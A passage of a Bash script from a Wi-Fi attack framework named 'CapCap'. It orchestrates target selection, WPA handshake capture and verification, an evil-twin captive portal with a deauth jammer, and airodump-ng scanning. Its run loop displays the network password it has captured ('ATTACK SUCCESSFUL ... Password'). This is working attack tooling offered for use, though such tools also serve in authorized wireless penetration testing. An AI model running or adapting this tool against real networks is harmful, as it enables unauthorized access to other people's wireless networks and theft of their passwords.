  # so verify it can see the target's current band. Otherwise the tracker
  # scans, never finds the AP, and falsely reports it gone (pausing the
  # attack). Mirrors the interactive filter: only 5GHz targets are gated,
  # since 2.4GHz support is assumed present on every wireless card.
  local trackerChannel=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
  if [ -n "$trackerChannel" ] && [ "$trackerChannel" -gt 14 ] 2>/dev/null; then
    interface_bands "$selectedInterface" 2>/dev/null
    if [[ "${InterfaceBands:-unknown}" != *"5GHz"* ]]; then
      if [ "$CAPCAPAuto" ]; then
        capcap_conditional_bail "$CAPCAPTargetTrackerInterfaceUnsupportedError"
        return 4
      fi
      echo -e "$CAPCAPVLine $CAPCAPTargetTrackerInterfaceUnsupportedError"
      sleep 5
      capcap_target_unset_tracker
      return 4
    fi
  fi

  if ! capcap_allocate_interface $selectedInterface; then
    echo "Failed to allocate tracking interface!" >> $CAPCAPOutputDevice
    return 3
  fi

  echo "Successfully got tracker interface." >> $CAPCAPOutputDevice
  echo "selectedInterface='$selectedInterface'" >> $CAPCAPOutputDevice
  echo "CapCapInterfaces[$selectedInterface]='${CapCapInterfaces[$selectedInterface]}'" >> $CAPCAPOutputDevice

  # Use the selected interface directly if it exists, otherwise lookup in hash
  if interface_is_real "$selectedInterface"; then
    echo "interface_is_real returned true, using direct" >> $CAPCAPOutputDevice
    CapCapTargetTrackerInterface="$selectedInterface"
  else
    echo "interface_is_real returned false, using hash lookup" >> $CAPCAPOutputDevice
    CapCapTargetTrackerInterface=${CapCapInterfaces[$selectedInterface]}
  fi
  echo "Final CapCapTargetTrackerInterface='$CapCapTargetTrackerInterface'" >> $CAPCAPOutputDevice
}

capcap_target_unset() {
  CapCapTargetMAC=""
  CapCapTargetSSID=""
  CapCapTargetChannel=""

  CapCapTargetEncryption=""

  CapCapTargetMakerID=""
  CapCapTargetMaker=""

  CapCapTargetSSIDClean=""

  CapCapTargetRogueMAC=""

  CapCapTargetClientsMAC=()
  CapCapTargetClientsPower=()
  CapCapTargetClientsVendor=()
  CapCapTargetClientsScanned=""

  return 1 # To trigger undo-chain.
}

capcap_target_set() {
  echo ">>> capcap_target_set called" >> "$CAPCAPOutputDevice"
  # Check if attack is targetted & set the attack target if so.
  if ! type -t attack_targetting_interfaces &> /dev/null; then
    echo ">>> attack_targetting_interfaces not found" >> "$CAPCAPOutputDevice"
    return 1
  fi
  echo ">>> attack_targetting_interfaces found" >> "$CAPCAPOutputDevice"

  if [[ \
    "$CapCapTargetSSID" && \
    "$CapCapTargetMAC" && \
    "$CapCapTargetChannel" \
  ]]; then
    # If we've got a candidate target, ask user if we'll keep targetting it.

    # Ensure rogue MAC is always computed when we have a valid target.
    # capcap_get_target normally computes this, but early returns bypass it.
    if [ -z "$CapCapTargetRogueMAC" ]; then
      local _rogueHex
      _rogueHex=$(printf %02X $((0x${CapCapTargetMAC:13:1} + 1)))
      CapCapTargetRogueMAC="${CapCapTargetMAC::13}${_rogueHex:1:1}${CapCapTargetMAC:14:4}"
    fi

    if [ "$CAPCAPAuto" ]; then
      return 0
    fi

    capcap_header
    capcap_target_show
    echo
    echo -e  "$CAPCAPVLine $CAPCAPTargettingAccessPointAboveNotice"

    # TODO: This doesn't translate choices to the selected language.
    while ! echo "$choice" | grep -q "^[ynYN]$" &> /dev/null; do
      echo -ne "$CAPCAPVLine $CAPCAPContinueWithTargetQuery [Y/n] "
      local choice
      read choice
      if [ ! "$choice" ]; then break; fi
    done

    echo -ne "\n\n"

    if [ "${choice,,}" != "n" ]; then
      return 0
    fi
  elif [[ \
    "$CapCapTargetSSID" || \
    "$CapCapTargetMAC" || \
    "$CapCapTargetChannel" \
  ]]; then
    # TODO: Survey environment here to autofill missing fields.
    # In other words, if a user gives incomplete information, scan
    # the environment based on either the ESSID or BSSID, & autofill.
    echo -e "$CAPCAPVLine $CAPCAPIncompleteTargettingInfoNotice"
    sleep 3
  fi

  echo "Starting capcap_get_interface for targetting" >> $CAPCAPOutputDevice
  if ! capcap_get_interface attack_targetting_interfaces \
    "$CAPCAPTargetSearchingInterfaceQuery"; then
    echo "capcap_get_interface failed for targetting" >> $CAPCAPOutputDevice
    return 2
  fi
  if ! capcap_allocate_interface $CapCapInterfaceSelected; then
    return 3
  fi

  # Use the selected interface directly if it exists, otherwise lookup in hash
  local targetInterface
  if interface_is_real "$CapCapInterfaceSelected"; then
    targetInterface="$CapCapInterfaceSelected"
  else
    targetInterface="${CapCapInterfaces[$CapCapInterfaceSelected]}"
  fi

  if ! capcap_get_target "$targetInterface"; then
    return 4
  fi

  # Release the scan interface so attack steps (jammer, captor) can reuse it.
  # The target info is already captured in CapCapTarget* variables.
  capcap_deallocate_interface "$targetInterface"
}


# =================== < Hash Subroutines > =================== #
# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
capcap_hash_verify() {
  if [ ${#@} -lt 3 ]; then return 1; fi

  local hashPath=$1

  # If no valid default path was passed, try to locate a handshake by BSSID.
  if [ ! "$hashPath" -o ! -s "$hashPath" ]; then
    local -r handshakeDir="$CAPCAPPath/attacks/Handshake Snooper/handshakes"
    if [ -d "$handshakeDir" ]; then
      local -r bssid_search="${2:-$CapCapTargetMAC}"
      local found_hash
      found_hash=$(ls "$handshakeDir"/*"${bssid_search^^}".cap 2>/dev/null | head -n1)
      if [ ! "$found_hash" ]; then
        found_hash=$(ls "$handshakeDir"/*"${bssid_search,,}".cap 2>/dev/null | head -n1)
      fi
      if [ "$found_hash" ]; then
        hashPath="$found_hash"
      fi
    fi
  fi
  local -r hashBSSID=$2
  local -r hashESSID=$3
  local -r hashChannel=$4
  local -r hashEncryption=$5
  local -r hashMaker=$6

  if [ ! -f "$hashPath" -o ! -s "$hashPath" ]; then
    echo -e "$CAPCAPVLine $CAPCAPHashFileDoesNotExistError"
    sleep 3
    return 2
  fi

  # cowpatty is the recommended/default handshake verifier for non-interactive
  # runs. aircrack-ng is offered as an alternative (it can validate modern
  # WPA2/PMF handshakes that cowpatty rejects, but is more optimistic about
  # partial captures), as is pyrit when installed.
  if [ "$CAPCAPAuto" ]; then
    local -r verifier="cowpatty"
  else
    capcap_header

    echo -e "$CAPCAPVLine $CAPCAPHashVerificationMethodQuery"
    echo

    capcap_target_show

    local choices=( \
      "$CAPCAPHashVerificationMethodAircrackOption" \
      "$CAPCAPHashVerificationMethodCowpattyOption" \
    )
    # Add pyrit to the options if available.
    if [ -x "$(command -v pyrit)" ]; then
      choices+=("$CAPCAPHashVerificationMethodPyritOption")
    fi
    choices+=("$CAPCAPGeneralBackOption")

    io_query_choice "" choices[@]

    echo

    case "$IOQueryChoice" in
      "$CAPCAPHashVerificationMethodPyritOption")
        local -r verifier="pyrit" ;;

      "$CAPCAPHashVerificationMethodAircrackOption")
        local -r verifier="aircrack-ng" ;;

      "$CAPCAPHashVerificationMethodCowpattyOption")
        local -r verifier="cowpatty" ;;

      "$CAPCAPGeneralBackOption")
        return -1 ;;
    esac
  fi

  hash_check_handshake \
    "$verifier" \
    "$hashPath" \
    "$hashESSID" \
    "$hashBSSID"

  local -r hashResult=$?

  # A value other than 0 means there's an issue with the hash.
  if [ $hashResult -ne 0 ]; then
    echo -e "$CAPCAPVLine $CAPCAPHashInvalidError"
  else
    echo -e "$CAPCAPVLine $CAPCAPHashValidNotice"
  fi

  sleep 3

  if [ $hashResult -ne 0 ]; then return 1; fi
}

capcap_hash_unset_path() {
  if [ ! "$CapCapHashPath" ]; then return 1; fi
  CapCapHashPath=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$CAPCAPAuto" ]; then return 2; fi
}

# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
capcap_hash_set_path() {
  if [ "$CapCapHashPath" ]; then return 0; fi

  capcap_hash_unset_path

  local -r hashPath=$1

  # If we've got a default path, check if a hash exists.
  # If one exists, ask users if they'd like to use it.
  if [ "$hashPath" -a -f "$hashPath" -a -s "$hashPath" ]; then
    if [ "$CAPCAPAuto" ]; then
      echo "Using default hash path: $hashPath" >> $CAPCAPOutputDevice
      CapCapHashPath=$hashPath
      return
    else
      local choices=( \
        "$CAPCAPUseFoundHashOption" \
        "$CAPCAPSpecifyHashPathOption" \
        "$CAPCAPHashSourceRescanOption" \
        "$CAPCAPGeneralBackOption" \
      )

      capcap_header

      echo -e "$CAPCAPVLine $CAPCAPFoundHashNotice"
      echo -e "$CAPCAPVLine $CAPCAPUseFoundHashQuery"
      echo

      io_query_choice "" choices[@]

      echo

      case "$IOQueryChoice" in
        "$CAPCAPUseFoundHashOption")
          CapCapHashPath=$hashPath
          return ;;

        "$CAPCAPHashSourceRescanOption")
          capcap_hash_set_path "$@"
          return $? ;;

        "$CAPCAPGeneralBackOption")
          return -1 ;;
      esac
    fi
  fi

  if [ "$CAPCAPAuto" ]; then
    # Auto mode: no hash path available, can't prompt user.
    echo "Auto mode: no hash file available." >> $CAPCAPOutputDevice
    return 1
  fi

  while [ ! "$CapCapHashPath" ]; do
    capcap_header

    echo
    echo -e "$CAPCAPVLine $CAPCAPPathToHandshakeFileQuery"
    echo -e "$CAPCAPVLine $CAPCAPPathToHandshakeFileReturnTip"
    echo
    echo -ne "$CAPCAPAbsolutePathInfo: "
    read -e CapCapHashPath

    # Back-track when the user leaves the hash path blank.
    # Notice: Path is cleared if we return, no need to unset.
    if [ ! "$CapCapHashPath" ]; then return 1; fi

    echo "Path given: \"$CapCapHashPath\"" >> $CAPCAPOutputDevice

    # Make sure the path points to a valid generic file.
    if [ ! -f "$CapCapHashPath" -o ! -s "$CapCapHashPath" ]; then
      echo -e "$CAPCAPVLine $CAPCAPEmptyOrNonExistentHashError"
      sleep 5
      capcap_hash_unset_path
    fi
  done
}

# Paramters: <defaultHashPath> <bssid> <essid>
capcap_hash_get_path() {
  # Assure we've got the bssid and the essid passed in.
  if [ ${#@} -lt 2 ]; then return 1; fi

  while true; do
    capcap_hash_unset_path
    capcap_hash_set_path "$@"
    local hash_set_result=$?

    # Handle user navigation separately from real errors.
    if [ $hash_set_result -ne 0 ]; then
      # 1  -> user hit enter on an empty path; keep looping so any
      #       previously found/default hash can be offered again.
      #       BUT if no valid default hash exists, allow going back.
      # 255-> user selected the explicit Back option; bubble up.
      if [ $hash_set_result -eq 1 ]; then
        # Only continue looping if a valid default hash file exists
        if [ -n "$1" ] && [ -f "$1" ] && [ -s "$1" ]; then
          continue  # Valid default hash exists, loop to offer it again
        else
          return -1  # No valid default hash, allow user to go back
        fi
      fi

      if [ $hash_set_result -eq 255 ]; then
        return -1
      fi

      echo "Failed to set hash path." >> $CAPCAPOutputDevice
      return -1 # WARNING: The recent error code is NOT contained in $? here!
    else
      echo "Hash path: \"$CapCapHashPath\"" >> $CAPCAPOutputDevice
    fi

    if capcap_hash_verify "$CapCapHashPath" "$2" "$3"; then
      break;
    fi
  done

  # At this point CapCapHashPath will be set and ready.
}


# ================== < Attack Subroutines > ================== #
capcap_unset_attack() {
  local -r attackWasSet=${CapCapAttack:+1}
  CapCapAttack=""
  if [ ! "$attackWasSet" ]; then return 1; fi
}

capcap_set_attack() {
  case "${CapCapAttack,,}" in
    captive*|*portal*) CapCapAttack="Captive Portal"; return 0;;
    handshake*|*snooper*) CapCapAttack="Handshake Snooper"; return 0;;
  esac
  if [ "$CapCapAttack" ]; then return 0; fi

  capcap_unset_attack

  local attacks
  readarray -t attacks < <(ls -1 "$CAPCAPPath/attacks")

  if [ "$CAPCAPAuto" ]; then
    # Auto mode: prefer Handshake Snooper (natural first step in the workflow).
    local __a
    for __a in "${attacks[@]}"; do
      if [ "$__a" = "Handshake Snooper" ]; then
        CapCapAttack="$__a"; break
      fi
    done
    if [ ! "$CapCapAttack" ]; then
      CapCapAttack="${attacks[0]}"
    fi
    echo "Auto-selected attack: $CapCapAttack" >> "$CAPCAPOutputDevice"
    return 0
  fi

  capcap_header

  echo -e "$CAPCAPVLine $CAPCAPAttackQuery"
  echo

  capcap_target_show

  local descriptions
  readarray -t descriptions < <(
    head -n 3 "$CAPCAPPath/attacks/"*"/language/$CapCapLanguage.sh" | \
    grep -E "^# description: " | sed -E 's/# \w+: //'
  )

  local identifiers=()

  local attack
  for attack in "${attacks[@]}"; do
    local identifier=$(
      head -n 3 "$CAPCAPPath/attacks/$attack/language/$CapCapLanguage.sh" | \
      grep -E "^# identifier: " | sed -E 's/# \w+: //'
    )
    if [ "$identifier" ]; then
      identifiers+=("$identifier")
    else
      identifiers+=("$attack")
    fi
  done

  attacks+=("$CAPCAPGeneralBackOption")
  identifiers+=("$CAPCAPGeneralBackOption")
  descriptions+=("")

  io_query_format_fields "" \
    "\t$CRed[$CSYel%d$CClr$CRed]$CClr%0.0s $CCyn%b$CClr %b\n" \
    attacks[@] identifiers[@] descriptions[@]

  echo

  if [ "${IOQueryFormatFields[1]}" = "$CAPCAPGeneralBackOption" ]; then
    return -1
  fi

  if [ "${IOQueryFormatFields[1]}" = "$CAPCAPAttackRestartOption" ]; then
    return 2
  fi


  CapCapAttack=${IOQueryFormatFields[0]}
  echo "Selected attack: $CapCapAttack" >> "$CAPCAPOutputDevice"
  return 0
}

capcap_unprep_attack() {
  if type -t unprep_attack &> /dev/null; then
    unprep_attack
  fi

  IOUtilsHeader="capcap_header"

  # Remove any lingering targetting subroutines loaded.
  unset attack_targetting_interfaces
  unset attack_tracking_interfaces

  # Remove any lingering restoration subroutines loaded.
  unset load_attack
  unset save_attack

  if [ "$CapCapTargetTrackerInterface" ]; then
    capcap_deallocate_interface "$CapCapTargetTrackerInterface" 2>/dev/null
    CapCapTargetTrackerInterface=""
  fi

  CapCapTargetClientsMAC=()
  CapCapTargetClientsPower=()
  CapCapTargetClientsVendor=()
  CapCapTargetClientsScanned=""

  return 1 # Trigger another undo since prep isn't significant.
}

capcap_prep_attack() {
  local -r path="$CAPCAPPath/attacks/$CapCapAttack"

  if [ ! -x "$path/attack.sh" ]; then return 1; fi
  if [ ! -x "$path/language/$CapCapLanguage.sh" ]; then return 2; fi

  # --site is a front-end convenience flag: the attack itself knows the portal
  # as -u/--ui. Translate it here so the GUI can name the template directly.
  # Only Captive Portal understands -u; passing it to other attacks would make
  # their own getopt fail, so it is ignored with a warning there.
  if [ "$CAPCAPUserInterface" ]; then
    if [ "$CapCapAttack" = "Captive Portal" ]; then
      AttackCLIArguments="${AttackCLIArguments:+$AttackCLIArguments }-u $CAPCAPUserInterface"
    else
      echo -e "$CAPCAPVLine $CAPCAPSiteIgnoredWarning"
    fi
  fi

  # Load attack parameters if any exist.
  if [ "$AttackCLIArguments" ]; then
    eval set -- "$AttackCLIArguments"
    # Remove them after loading them once.
    unset AttackCLIArguments
  fi

  # Load attack and its corresponding language file.
  # Load english by default to overwrite globals that ARE defined.
  source "$path/language/en.sh"
  if [ "$CapCapLanguage" != "en" ]; then
    source "$path/language/$CapCapLanguage.sh"
  fi
  source "$path/attack.sh"

  # Check if attack is targetted & set the attack target if so.
  if type -t attack_targetting_interfaces &> /dev/null; then
    echo "Calling capcap_target_set" >> "$CAPCAPOutputDevice"
    if ! capcap_target_set; then 
      echo "capcap_target_set FAILED" >> "$CAPCAPOutputDevice"
      return 3
    fi
    echo "capcap_target_set SUCCESS" >> "$CAPCAPOutputDevice"
  fi

  # Check if attack provides tracking interfaces, get & set one.
  # TODO: Uncomment the lines below after implementation.
  echo "Checking for attack_tracking_interfaces" >> "$CAPCAPOutputDevice"
  if type -t attack_tracking_interfaces &> /dev/null; then
    echo "Calling capcap_target_set_tracker" >> "$CAPCAPOutputDevice"
    if ! capcap_target_set_tracker; then 
      echo "capcap_target_set_tracker FAILED" >> "$CAPCAPOutputDevice"
      return 4
    fi
    echo "capcap_target_set_tracker SUCCESS" >> "$CAPCAPOutputDevice"
  fi

  # If attack is capable of restoration, check for configuration.
  if type -t load_attack &> /dev/null; then
    # If configuration file available, check if user wants to restore.
    if [ -f "$path/attack.conf" ]; then
      if [ "$CAPCAPAuto" ]; then
        # Auto mode: skip restore, reset fresh.
        echo "Auto mode: skipping attack config restore." >> $CAPCAPOutputDevice
      else
        local choices=( \
          "$CAPCAPAttackRestoreOption" \
          "$CAPCAPAttackResetOption" \
        )

        io_query_choice "$CAPCAPAttackResumeQuery" choices[@]

        if [ "$IOQueryChoice" = "$CAPCAPAttackRestoreOption" ]; then
          load_attack "$path/attack.conf"
        fi
      fi
    fi
  fi

  if ! prep_attack; then return 5; fi

  # Save the attack for user's convenience if possible.
  if type -t save_attack &> /dev/null; then
    save_attack "$path/attack.conf"
  fi
}

capcap_handshake_success_banner() {
  local handshakePath="$1"
  local rule="  ${CSGrn}============================================================${CClr}"

  echo
  echo -e "$rule"
  echo -e "  ${CSGrn} ${CAPCAPHandshakeBannerTitle}${CClr}"
  echo -e "$rule"
  echo -e "  ${CGrn}${CAPCAPHandshakeBannerNetwork} :${CClr} ${CSWht}${CapCapTargetSSID:-?}${CClr}"
  echo -e "  ${CGrn}${CAPCAPHandshakeBannerBssid}     :${CClr} ${CSWht}${CapCapTargetMAC:-?}${CClr}"
  echo -e "  ${CGrn}${CAPCAPHandshakeBannerSaved} :${CClr} ${CSWht}${handshakePath}${CClr}"
  echo
  echo -e "  ${CSWht}${CAPCAPHandshakeBannerStopped}${CClr}"
  echo
  echo -e "  ${CYel}${CAPCAPHandshakeBannerNext}${CClr}"
  echo -e "  ${CGrn}1)${CClr} ${CAPCAPHandshakeBannerOption1}"
  echo -e "  ${CGrn}2)${CClr} ${CAPCAPHandshakeBannerOption2}"
  echo -e "$rule"
  echo
}

capcap_run_attack() {
  # Remove stale completion signals left by a previous run so the auto-mode
  # watcher does not immediately exit on a fresh attack cycle.
  rm -f "$CAPCAPWorkspacePath/status.txt" \
        "$CAPCAPWorkspacePath/authenticator_success.flag" \
        "$CAPCAPWorkspacePath/handshake_success.flag" \
        2>/dev/null

  start_attack
  capcap_target_tracker_start
  capcap_status "ATTACK_STARTED attack=$CapCapAttack"

  if [ "$CAPCAPAuto" ]; then
    # Auto mode: poll for attack self-termination (e.g., handshake captured,
    # password found) by checking for status.txt or success flags.
    echo "Auto mode: waiting for attack to complete..." >> $CAPCAPOutputDevice
    # Snapshot the arbiter PID now — the SIGABRT trap calls stop_attack which
    # clears HandshakeSnooperArbiterPID, so we need our own copy to track it.
    local autoArbiterPID="$HandshakeSnooperArbiterPID"
    local autoTimeout=0
    local autoMaxWait=0  # 0 = infinite (no timeout)
    if [ "$CAPCAPTimeout" ]; then
      autoMaxWait=$((CAPCAPTimeout * 60))
    fi
    while [ $autoMaxWait -eq 0 ] || [ $autoTimeout -lt $autoMaxWait ]; do
      # Check if attack finished (captive portal writes status.txt on success)
      if [ -f "$CAPCAPWorkspacePath/status.txt" ]; then
        echo "Auto mode: attack completed (status file found)." >> $CAPCAPOutputDevice
        capcap_status "ATTACK_FINISHED reason=credentials"
        break
      fi
      # Check if handshake was captured
      if [ -f "$CAPCAPWorkspacePath/authenticator_success.flag" ]; then
        echo "Auto mode: attack completed (success flag found)." >> $CAPCAPOutputDevice
        capcap_status "ATTACK_FINISHED reason=credentials"
        break
      fi
      # Check if arbiter daemon completed (handshake snooper).
      # Use the snapshotted PID — HandshakeSnooperArbiterPID may be cleared by
      # the SIGABRT trap before we get to check it.
      if [ "$autoArbiterPID" ] && ! kill -0 "$autoArbiterPID" 2>/dev/null; then
        echo "Auto mode: arbiter daemon exited." >> $CAPCAPOutputDevice
        capcap_status "ATTACK_FINISHED reason=handshake"
        break
      fi
      sleep 5
      autoTimeout=$((autoTimeout + 5))
    done

    if [ $autoMaxWait -gt 0 ] && [ $autoTimeout -ge $autoMaxWait ]; then
      echo "Auto mode: timeout reached (${CAPCAPTimeout}m), stopping attack." >> $CAPCAPOutputDevice
      capcap_status "TIMEOUT minutes=$CAPCAPTimeout"
    fi
  else
    local choices=( \
      "$CAPCAPSelectAnotherAttackOption" \
      "$CAPCAPGeneralExitOption" \
    )

    # Display the attack-in-progress menu once (same layout as io_query_choice).
    capcap_header
    echo -e "$CAPCAPVLine $(io_dynamic_output $CAPCAPAttackInProgressNotice)"
    echo
    local _ci=1
    for _c in "${choices[@]}"; do
      echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
      _ci=$((_ci + 1))
    done
    echo
    echo -ne "$IOUtilsPrompt"

    # Poll for attack self-completion every second using read -t 1.
    # This keeps us in normal code flow (no signal tricks) so that the
    # success display in capcap_handle_exit works as a plain function call.
    local _attackSucceeded=0
    local _handshakeNotified=0
    local _captiveNotified=0
    while true; do
      # Handshake Snooper: arbiter daemon writes this flag on success.
      # Redraw once with a success notice; then keep waiting for the user
      # to choose the next step (another attack or exit).
      if [ $_handshakeNotified -eq 0 ] && \
         [ -f "$CAPCAPWorkspacePath/handshake_success.flag" ]; then
        _handshakeNotified=1
        rm -f "$CAPCAPWorkspacePath/handshake_success.flag"
        capcap_header
        capcap_handshake_success_banner \
          "$CAPCAPPath/attacks/Handshake Snooper/handshakes/$CapCapTargetSSIDClean-$CapCapTargetMAC.cap"
        _ci=1
        for _c in "${choices[@]}"; do
          echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
          _ci=$((_ci + 1))
        done
        echo
        echo -ne "$IOUtilsPrompt"
      fi
      # Captive Portal: authenticator writes status.txt when credentials are
      # verified. Stop all attack services immediately (rogue AP, DNS, DHCP,
      # web server, deauth jammer), then redraw showing the credentials and
      # wait for the user to choose the next step.
      if [ $_captiveNotified -eq 0 ] && \
         [ -f "$CAPCAPWorkspacePath/status.txt" ]; then
        _captiveNotified=1
        capcap_target_tracker_stop
        stop_attack
        local _captivePwd
        _captivePwd=$(cat "$CAPCAPWorkspacePath/candidate.txt" 2>/dev/null)
        capcap_header
        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
        echo -e "  ${CSGrn}|           ATTACK SUCCESSFUL                   |${CClr}"
        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
        echo -e "  ${CGrn}  Network  :${CClr} ${CSWht}$CapCapTargetSSID${CClr}"
        echo -e "  ${CGrn}  BSSID    :${CClr} ${CSWht}$CapCapTargetMAC${CClr}"
        echo -e "  ${CYel}  Password :${CClr} ${CSYel}$_captivePwd${CClr}"
        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
        echo
        _ci=1
        for _c in "${choices[@]}"; do
          echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
          _ci=$((_ci + 1))
        done
        echo
        echo -ne "$IOUtilsPrompt"
      fi
      local _inp=""
      if read -t 1 -r _inp 2>/dev/null && [ -n "$_inp" ]; then
        if [ "$_inp" = "1" ]; then
          IOQueryChoice="${choices[0]}"; break
        elif [ "$_inp" = "2" ]; then
          IOQueryChoice="${choices[1]}"; break
        fi
      fi
    done

    echo
  fi

  # IOQueryChoice is a global, meaning, its value is volatile.
  # We need to make sure to save the choice before it changes.
  local choice="$IOQueryChoice"

  capcap_target_tracker_stop


  # Restore systemd-resolved DNS after the attack intercepted DNS traffic.
  # Run in background with a timeout so it never blocks the exit path.
  if command -v systemctl &>/dev/null; then
    timeout 5 systemctl try-restart systemd-resolved.service &>/dev/null &
  fi

  stop_attack

  if [ "$CAPCAPAuto" ] || [ "$choice" = "$CAPCAPGeneralExitOption" ]; then
    capcap_handle_exit
  fi

  capcap_unprep_attack
  capcap_unset_attack
}

# ============================================================ #
# ================= < Argument Executables > ================= #
# ============================================================ #
eval set -- "$CAPCAPCLIArguments" # Set environment parameters.
while [ "$1" != "" -a "$1" != "--" ]; do
  case "$1" in
    -t|--target) echo "Not yet implemented!"; sleep 3; capcap_shutdown;;
  esac
  shift # Shift new parameters
done

# ============================================================ #
# ================ < Install Dependencies Mode > ============= #
# ============================================================ #
# `--install-deps` yalnızca eksik paketleri kurar ve çıkar. GUI ilk açılışta
# bunu çağırır; böylece kullanıcı saldırı başlatmadan önce kurulumu görür.
if [ "$CAPCAPInstallDeps" = "1" ]; then
  capcap_set_resolution
  CapCapLanguage="${CapCapLanguage:-tur}"
  # Önce İngilizce, sonra seçilen dil: eksik çeviri anahtarları boş kalmasın.
  source "$CAPCAPPath/language/en.sh"
  if [ "$CapCapLanguage" != "en" ] && [ -f "$CAPCAPPath/language/$CapCapLanguage.sh" ]; then
    source "$CAPCAPPath/language/$CapCapLanguage.sh"
  fi
  echo "$CAPCAPInstallDepsNotice"
  if capcap_configure_dependencies; then
    echo "$CAPCAPInstallDepsDone"
    exit 0
  fi
  echo "$CAPCAPInstallDepsFailed" >&2
  exit 7
fi

# ============================================================ #
# ============== < List Interfaces Mode > =================== #
# ============================================================ #
if [ "$CAPCAPListInterfaces" ]; then  interface_list_wireless
  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
    echo "No wireless interfaces detected."
    exit 1
  fi
  printf "%-16s %-8s %-16s %-8s %-12s %s\n" "INTERFACE" "STATE" "BANDS" "BUS" "DRIVER" "CHIPSET"
  for iface in "${InterfaceListWireless[@]}"; do
    interface_chipset "$iface" 2>/dev/null
    interface_driver "$iface" 2>/dev/null
    interface_state "$iface" 2>/dev/null
    interface_bands "$iface" 2>/dev/null
    printf "%-16s %-8s %-16s %-8s %-12s %s\n" \
      "$iface" \
      "${InterfaceState:-unknown}" \
      "${InterfaceBands:-unknown}" \
      "${InterfaceHardwareBus:-unknown}" \
      "${InterfaceDriver:-unknown}" \
      "${InterfaceChipset:-unknown}"
  done
  exit 0
fi

# ============================================================ #
# ================= < Scan-Only Mode > ====================== #
# ============================================================ #
capcap_scan_only() {
  # Minimal startup: skip banner/update, just check deps.
  if [ ! "$CAPCAPDebug" ]; then
    iptables-save >"$CAPCAPIPTablesBackup" 2>/dev/null
  fi

  capcap_set_resolution

  # Set language for scanner strings.
  CapCapLanguage="${CapCapLanguage:-en}"
  source "$CAPCAPPath/language/$CapCapLanguage.sh"

  # Get wireless interface: use --interface if specified, otherwise first available.
  interface_list_wireless
  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
    echo "ERROR: No wireless interfaces found." >&2
    exit 1
  fi

  local scanInterface=""
  if [ "$CAPCAPInterface" ]; then
    # Validate the requested interface exists and is wireless.
    if interface_is_wireless "$CAPCAPInterface"; then
      scanInterface="$CAPCAPInterface"
    else
      echo "ERROR: Interface '$CAPCAPInterface' is not a wireless interface." >&2
      exit 1
    fi
  else
    scanInterface="${InterfaceListWireless[0]}"
  fi
  echo "Using interface: $scanInterface" >&2

  # Allocate (put into monitor mode).
  if ! capcap_allocate_interface "$scanInterface"; then
    echo "ERROR: Failed to allocate interface $scanInterface" >&2
    exit 1
  fi

  # Resolve the monitor-mode interface name.
  local monInterface="$scanInterface"
  if [ "${CapCapInterfaces[$scanInterface]}" ]; then
    monInterface="${CapCapInterfaces[$scanInterface]}"
    # If original was renamed, the new name is the monitor interface
    if interface_is_real "$monInterface"; then
      : # good
    else
      monInterface="$scanInterface"
    fi
  fi

  # Determine channel/band params.
  local channelParam=""
  local bandParam=""
  if [ "$CapCapTargetChannel" ]; then
    channelParam="--channel $CapCapTargetChannel"
  fi
  if [ "$CAPCAPBand" ]; then
    bandParam="--band $CAPCAPBand"
  elif [ "$CapCapTargetChannel" ]; then
    local firstCh=$(echo "$CapCapTargetChannel" | grep -oE '[0-9]+' | head -1)
    if [ -n "$firstCh" ] && [ "$firstCh" -le 14 ]; then
      bandParam="--band bg"
    else
      bandParam="--band a"
    fi
  else
    bandParam="--band bg"
  fi

  # Clean old scan files.
  sandbox_remove_workfile "$CAPCAPWorkspacePath/dump*"

  # Run scan in background, wait for scan-time, then kill.
  local scanCmd="airodump-ng -Mat WPA $channelParam $bandParam -w \"$CAPCAPWorkspacePath/dump\" $monInterface"
  local scanPID
  capcap_window_open scanPID "Scanner" "" "#000000" "#FFFFFF" "$scanCmd"

  echo "Scanning for ${CAPCAPScanTime}s..." >&2
  sleep "$CAPCAPScanTime"
  capcap_window_close scanPID
  sleep 1

  # Parse results.
  if [ ! -f "$CAPCAPWorkspacePath/dump-01.csv" ] || \
     [ ! -s "$CAPCAPWorkspacePath/dump-01.csv" ]; then
    echo "ERROR: No scan results captured." >&2
    capcap_deallocate_interface "$scanInterface" 2>/dev/null
    exit 1
  fi

  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
  local candidates
  readarray -t candidates < <(
    awk -F, "NF>=15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$CAPCAPWorkspacePath/dump-01.csv"
  )
  local clients
  readarray -t clients < <(
    awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$CAPCAPWorkspacePath/dump-01.csv"
  )

  if [ ${#candidates[@]} -eq 0 ]; then
    echo "No WPA networks found." >&2
    capcap_deallocate_interface "$scanInterface" 2>/dev/null
    exit 0
  fi

  # Build vendor lookup from kismet netxml if available.
  local -A vendorLookup
  if [ -f "$CAPCAPWorkspacePath/dump-01.kismet.netxml" ]; then
    local currentMAC=""
    while IFS= read -r line; do
      if [[ "$line" =~ \<BSSID\>([A-F0-9:]+)\</BSSID\> ]]; then
        currentMAC="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ \<manuf\>(.+)\</manuf\> ]] && [ -n "$currentMAC" ]; then
        local manufName="${BASH_REMATCH[1]}"
        manufName=$(echo "$manufName" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g')
        if [ "$manufName" != "Unknown" ]; then
          vendorLookup["$currentMAC"]="$manufName"
        fi
        currentMAC=""
      fi
    done < "$CAPCAPWorkspacePath/dump-01.kismet.netxml"
  fi

  # Print header.
  printf "%-4s %-17s %-4s %-5s %-4s %-10s %-30s %s\n" \
